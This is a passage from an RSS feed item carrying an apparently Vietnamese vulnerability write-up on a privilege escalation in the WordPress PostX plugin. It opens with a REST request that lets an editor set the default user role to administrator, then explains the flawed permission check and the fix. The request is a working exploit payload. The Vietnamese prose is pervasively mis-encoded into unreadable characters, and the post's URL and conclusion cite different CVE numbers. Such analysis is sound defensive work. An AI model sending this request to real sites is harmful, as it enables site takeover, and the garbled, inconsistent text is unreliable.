/wp-json/ultp/v1/postx_presets/ HTTP/1.1&#xA;Host: localhost&#xA;Cookie: editor_cookie &#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;type=set&amp;amp;key=default_role&amp;amp;data=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-05-cve-2025-55707/default.png&#34; title=&#34;Default role&#34; data-thumbnail=&#34;/posts/2026-01-05-cve-2025-55707/default.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Default role&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-05-cve-2025-55707/default.png&#39; alt=&#34;Result&#34; height=&#34;883&#34; width=&#34;1485&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Default role&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;T·∫°o user m·ªõi v√† login&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng CVE-2025-53425 xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;k·∫øt h·ª£p kh√¥ng nh·∫•t qu√°n gi·ªØa ki·ªÉm so√°t quy·ªÅn ·ªü m·ª©c REST API v√† logic x·ª≠ l√Ω trong callback&lt;/strong&gt;. M·∫∑c d√π endpoint REST ch·ªâ y√™u c·∫ßu quy·ªÅn &lt;code&gt;edit_posts&lt;/code&gt;, nh∆∞ng h√†nh vi nguy hi·ªÉm nh·∫•t (&lt;code&gt;update_option()&lt;/code&gt;) l·∫°i ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng &lt;code&gt;edit_others_posts&lt;/code&gt;, cho ph√©p &lt;strong&gt;Editor&lt;/strong&gt; th·ª±c hi·ªán c√°c thay ƒë·ªïi nh·∫°y c·∫£m trong b·∫£ng &lt;code&gt;wp_options&lt;/code&gt;. Khi k·∫øt h·ª£p v·ªõi REST API nonce h·ª£p l·ªá, m·ªôt Editor c√≥ th·ªÉ l·ª£i d·ª•ng endpoint n√†y ƒë·ªÉ thay ƒë·ªïi c√°c option quan tr·ªçng, d·∫´n ƒë·∫øn &lt;strong&gt;Privilege Escalation&lt;/strong&gt;. B·∫£n v√° ·ªü phi√™n b·∫£n &lt;code&gt;4.1.36&lt;/code&gt; ƒë√£ kh·∫Øc ph·ª•c tri·ªát ƒë·ªÉ v·∫•n ƒë·ªÅ b·∫±ng c√°ch gi·ªõi h·∫°n endpoint ch·ªâ cho ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;manage_options&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;permission_callback&lt;/code&gt; ph·∫£i &lt;strong&gt;ph·∫£n √°nh ch√≠nh x√°c m·ª©c ƒë·ªô nh·∫°y c·∫£m c·ªßa h√†nh vi trong callback&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;update_option()&lt;/code&gt; l√† h√†m &lt;strong&gt;r·∫•t nguy hi·ªÉm&lt;/strong&gt; n·∫øu kh√¥ng b·ªã gi·ªõi h·∫°n quy·ªÅn ch·∫∑t ch·∫Ω&lt;/li&gt;&#xA;&lt;li&gt;REST API nonce &lt;strong&gt;ch·ªâ ch·ªëng CSRF&lt;/strong&gt;, kh√¥ng thay th·∫ø cho ki·ªÉm so√°t ph√¢n quy·ªÅn&lt;/li&gt;&#xA;&lt;li&gt;Editor &lt;strong&gt;kh√¥ng n√™n&lt;/strong&gt; ƒë∆∞·ª£c ph√©p thay ƒë·ªïi c√°c global option ·∫£nh h∆∞·ªüng ƒë·∫øn to√†n h·ªá th·ªëng&lt;/li&gt;&#xA;&lt;li&gt;V√° l·ªói hi·ªáu qu·∫£ nh·∫•t l√† &lt;strong&gt;ƒë·∫∑t quy·ªÅn cao ngay t·ª´ REST endpoint&lt;/strong&gt;, thay v√¨ ki·ªÉm tra r·∫£i r√°c trong callback&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ultimate-post/vulnerability/wordpress-postx-plugin-4-1-35-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PostX Plugin &amp;lt;= 4.1.35 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
